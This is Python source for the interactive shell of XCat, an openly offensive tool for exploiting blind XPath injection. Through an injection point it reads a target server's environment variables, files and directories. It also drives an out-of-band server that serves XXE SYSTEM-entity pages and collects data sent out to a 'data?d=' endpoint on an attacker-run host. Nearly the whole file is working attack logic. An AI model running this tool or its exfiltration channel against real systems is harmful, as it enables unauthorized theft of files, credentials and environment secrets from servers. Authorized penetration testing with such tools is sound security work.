import asyncio
from typing import List, Dict, FrozenSet
import shlex

import click
import appdirs
from pathlib import Path
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.styles import Style
from xpath import func, E

from . import algorithms, display, oob
from .attack import AttackContext, check


class BaseCommand:
    name: str
    alias: List[str] = []
    help_text: str
    args: List[str] = []
    required_features: FrozenSet[str] = frozenset()
    context: AttackContext

    def __init__(self, context: AttackContext):
        self.context = context

    def print_usage(self):
        args = ' '.join(f'[{a}]' for a in self.args)
        print(f'Usage: {self.name} {args}')

    async def run(self, args):
        raise NotImplementedError()

    def has_features(self, current_features: Dict[str, bool]):
        if not self.required_features:
            return True
        return any(current_features[f] for f in self.required_features)

    @classmethod
    def help_display(cls):
        if cls.args:
            args = ' '.join(f'[{a}]' for a in cls.args)
            return f'{args} - {cls.help_text}'
        return cls.help_text


class Env(BaseCommand):
    name = 'env'
    help_text = 'Read environment variables'
    required_features = {'environment-variables'}

    async def run(self, args):
        expr = func.available_environment_variables()
        total = await algorithms.count(self.context, expr)
        for name_expr in expr[:total + 1]:
            env_name = await algorithms.get_string(self.context, name_expr)
            print(f'{env_name}=', end='')
            value_expr = func.environment_variable(name_expr)
            env_value = await algorithms.get_string(self.context, value_expr)
            print(env_value)


class Pwd(BaseCommand):
    name = 'pwd'
    help_text = 'Get current working directory'
    required_features = {'document-uri', 'base-uri'}

    @staticmethod
    def cwd_expression(features):
        if features['base-uri']:
            return func.base_uri()
        else:
            return func.document_uri(E('/'))

    async def run(self, args):
        expr = self.cwd_expression(self.context.features)
        print(await algorithms.get_string(self.context, expr))


class Get(BaseCommand):
    name = 'get'
    help_text = 'Fetch a specific node by xpath expression'
    args = ['expression']

    async def run(self, args):
        expression = args[0]
        await display.display_xml(
            algorithms.get_nodes(self.context, E(expression))
        )


class GetString(BaseCommand):
    name = 'get-string'
    help_text = 'Fetch a specific string by xpath expression'
    args = ['expression']

    async def run(self, args):
        expression = args[0]
        print(algorithms.get_string(self.context, E(expression)))


class Time(BaseCommand):
    name = 'time'
    help_text = 'Get the current date+time of the server'
    required_features = {'current-datetime'}

    async def run(self, args):
        print(await algorithms.get_string(self.context,
                                          func.string(func.current_dateTime())))


class Cat(BaseCommand):
    name = 'cat'
    alias = ['ls']
    help_text = 'Read a file or directory'
    args = ['path']
    required_features = {'unparsed-text'}

    async def run(self, args):
        if not args:
            path = Pwd.cwd_expression(self.context.features)
        else:
            path = args[0]
        available = await check(self.context, func.unparsed_text_available(path))
        if not available:
            print(f'File {path} does not seem to be available')
            if input('Try anyway? [y/n]').lower() != 'y':
                return

        expr = func.unparsed_text_lines(path)
        length = await algorithms.count(self.context, expr)
        print(f'Lines: {length}')
        for line in algorithms.iterate_all(self.context, expr[:length + 1], disable_normalization=True):
            print(await line)


class ToggleFeature(BaseCommand):
    name = 'toggle'
    help_text = 'Toggle features on or off'

    async def run(self, args):
        if not args:
            print('Usage: toggle [feature name]')
            print('Available features and values:')
            for feature, enabled in self.context.features.items():
                click.echo(f'{feature} = ', nl=False)
                click.echo(
                    click.style(
                        'on' if enabled else 'off',
                        'bright_green' if enabled else 'red'
                    )
                )
        else:
            feature_name = args[0]
            current_value = self.context.features[feature_name]
            self.context.features[feature_name] = not current_value
            print(f'{feature_name} now {"on" if not current_value else "off"}')


class Resolve(BaseCommand):
    name = 'resolve'
    help_text = 'Resolve a file name to an absolute URI'
    args = ['path']

    async def run(self, args):
        if not args:
            return self.print_usage()
        path = args[0]
        expr = func.resolve_uri(path, func.document_uri(E('/')))
        print(await algorithms.get_string(self.context, expr))


class Find(BaseCommand):
    name = 'find'
    help_text = 'Find a file by name in parent directories'
    args = ['name']

    async def run(self, args):
        if not args:
            return self.print_usage()
        name = args[0]
        for i in range(10):
            rel_path = ('../' * i) + name
            print(f'Searching for {rel_path}')
            expr = func.resolve_uri(rel_path, func.document_uri(E('/')))
            if await check(self.context, func.doc_available(expr)):
                click.echo(click.style(f'XML file {rel_path} available', 'bright_green'))
            elif await check(self.context, func.unparsed_text_available(expr)):
                click.echo(click.style(f'Text file {rel_path} available', 'bright_green'))


class OOBExpectData(BaseCommand):
    name = 'expect-data'
    help_text = 'Add an entry to the OOB server to expect some data'

    async def run(self, args):
        if not self.context.oob_app:
            print('Error: OOB server is not enabled')
            return
        identifier, _ = oob.expect_data(self.context.oob_app)
        print(f'Identifier created: {identifier}')
        print(f'Hitting {self.context.oob_host}/data/{identifier}?d=[DATA] will save this data')
        print(f'Use {GetOOBData.name} {identifier} to retrieve it')


class OOBExpectEntity(BaseCommand):
    name = 'expect-entity-injection'
    help_text = 'Add an entry to the OOB server to expect a SYSTEM entity injection'
    args = ['file_path']

    async def run(self, args):
        if not args:
            return self.print_usage()
        if not self.context.oob_app:
            print('Error: OOB server is not enabled')
            return
        file_path = args[0]
        identifier, _ = oob.expect_entity_injection(self.context.oob_app, f'SYSTEM "{file_path}"')
        print(f'Identifier created: {identifier}')
        print(f'Hitting {self.context.oob_host}/entity/{identifier} will server a XXE page')
        print(f'Hitting {self.context.oob_host}/data/{identifier}?d=[DATA] will save the data')
        print(f'Use {GetOOBData.name} {identifier} to retrieve it')


class GetOOBData(BaseCommand):
    name = 'get-oob-data'
    help_text = 'Get OOB data from an identifier'
    args = ['identifier']

    async def run(self, args):
        if not args:
            return self.print_usage()
        if not self.context.oob_app:
            print('Error: OOB server is not enabled')
            return
        identifier = args[0]
        if identifier not in self.context.oob_app['expectations']:
            print(f'Error: {identifier} not found. Did you register it with {OOBExpectData.name}?')
            return
        # Bit hacky
        future: asyncio.Future = self.context.oob_app['expectations'][identifier]
        if not future.done():
            print(f'Error: {identifier} has received no data yet.')
        else:
            print(f'Data received for {identifier}:')
            print(future.result())


class Exit(BaseCommand):
    name = 'exit'
    help_text = 'Quit the shell'

    async def run(self, args):
        exit(0)


class Help(BaseCommand):
    name = 'help'
    help_text = 'Get help'

    async def run(self, args):
        print('Available commands:')
        for command in BaseCommand.__subclasses__():
            click.echo(click.style(command.name, 'bright_green'), nl=False)
            print(f': {command.help_display()}')


async def shell_loop(context: AttackContext):
    history_dir = Path(appdirs.user_data_dir('python-xcat'))
    if not history_dir.exists():
        history_dir.mkdir(parents=True)
    history = FileHistory(history_dir / 'history')
    session = PromptSession(history=history)

    commands: Dict[str, BaseCommand] = {
        c.name: c(context)
        for c in BaseCommand.__subclasses__()
    }

    for c in BaseCommand.__subclasses__():
        for alias in c.alias:
            commands[alias] = commands[c.name]
    completer = WordCompleter(
        commands.keys(),
        meta_dict={
            name: command.help_display()
            for name, command in commands.items()
        }
    )
    style = Style.from_dict({
        'prompt': '#884444',
        'dollar': '#00aa00'
    })

    while True:
        user_input = await session.prompt_async(
            [
                ('class:prompt', 'XCat'),
                ('class:dollar', '$ ')
            ],
            style=style,
            completer=completer,
            auto_suggest=AutoSuggestFromHistory()
        )

        split_input = shlex.split(user_input)
        if not split_input:
            continue

        name, args = split_input[0], split_input[1:]

        if name not in commands:
            print(f'Unknown command {name}. Use "help" to get help')
            continue

        command = commands[name]

        if not command.has_features(context.features):
            print(click.style('Error: ', 'red'), end='')
            print(f'Cannot use {name} as not all features are '
                  f'present in this injection')
            if command.required_features:
                print('Required features: ', end='')
                print(click.style(', '.join(command.required_features), 'red'))
                print('Use toggle_feature to force these on')
        else:
            await command.run(args)
